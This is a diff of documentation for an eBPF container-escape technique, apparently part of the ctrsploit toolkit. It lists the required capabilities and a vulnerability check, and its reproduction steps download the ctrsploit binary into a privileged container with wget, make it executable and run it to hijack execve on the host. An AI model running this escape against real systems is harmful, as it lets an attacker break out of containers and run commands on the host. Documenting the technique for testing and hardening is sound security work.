@@ -1,8 +1,32 @@
-# ebpf escape by execve
+# ebpf escape by hooking execve syscall
 
-replace the first arg of execve
+## 1. Vulnerability Introduction
+
+This vulnerability describes a container escape method that leverages eBPF.
+
+When a container is granted excessive privileges (such as CAP_SYS_ADMIN or CAP_BPF), an attacker can load a malicious eBPF program into the host's kernel from within the container.
+
+This eBPF program can inject evil command by replacing the first arg of execve.
+
+## 2. Exploit Scenario
+
+Insecure configuration
+
+## 3. Prerequisites
+
+vulnerability exists:
+* CAP_BND: CAP_SYS_ADMIN / CAP_BPF
+
+vulnerability exploitable:
+* CAP_EFF: CAP_SYS_ADMIN
+
+## 4. Vulnerability Existence Check
+
+`ctrsploit checksec ebpf`
 
 ## 5. Reproduce
+
+![](./video.svg)
 
 ### 5.1 Reproduce Environment
 
@@ -69,7 +93,7 @@ $ ./ssh
 root@localhost:~# docker run -ti --cap-add=CAP_SYS_ADMIN busybox:latest ash
 / # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
 / # chmod +x /usr/bin/ctrsploit
-/ # ctrsploit vul caps sys_admin x ebpf execve -c /bin/ls
+/ # ctrsploit vul caps sys_admin x ebpf execve -p /bin/ls
 INFO[0000] Waiting for events..
 ```
 
